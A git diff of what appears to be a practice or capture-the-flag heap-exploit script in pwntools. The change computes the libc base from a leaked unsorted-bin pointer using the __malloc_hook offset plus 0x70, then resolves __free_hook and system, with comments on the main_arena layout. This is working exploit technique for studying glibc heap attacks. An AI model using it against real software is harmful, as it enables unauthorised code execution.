@@ -57,8 +57,9 @@ libc.address = fd_leak - LEAK_OFFSET  # Replace LEAK_OFFSET with the hex number 
 print(f"[+] Libc Base: {hex(libc.address)}")
 print(f"[+] __free_hook: {hex(libc.sym['__free_hook'])}")
 print(f"[+] system: {hex(libc.sym['system'])}")
-'''
+
 OFFSET = 0x1ecbe0
+'''
 # why 96 and 0x10"
 # - when a chunk is in the unsorted bin, its forward pointer points to the head of the list inside the main_arena. however, it doesn't point 
 #   at the very beginning of main_arena. it points to the structure bins, which start exactly 96 bytes after the beginning of main_arena.
@@ -66,7 +67,15 @@ OFFSET = 0x1ecbe0
 #   and due to 8 byte alignment, the main_arena begins exactly 16 bytes after the start of __malloc_hook.
 
 # we leaked the forward pointer, so we need to calculate the offset that we will use to obtain the base address of libc. 
-libc.address = libc_leak - OFFSET
+#libc.address = libc_leak - OFFSET
+# another thik to do is simply subtract the mallo_hook offset + ox70 (96 + 0x10) to the leak
+
+malloc_hook_offset = libc.sym.__malloc_hook
+# we know that main arena is at malloc_hook addr + 0x10, and bins[0] at main arena + 0x60\
+main_arena_bin_offset = malloc_hook_offset + 0x70
+
+libc.address = libc_leak - main_arena_bin_offset
+
 print(f"[+] System address: {hex(libc.address)}")
 
 free_hook = libc.sym['__free_hook']
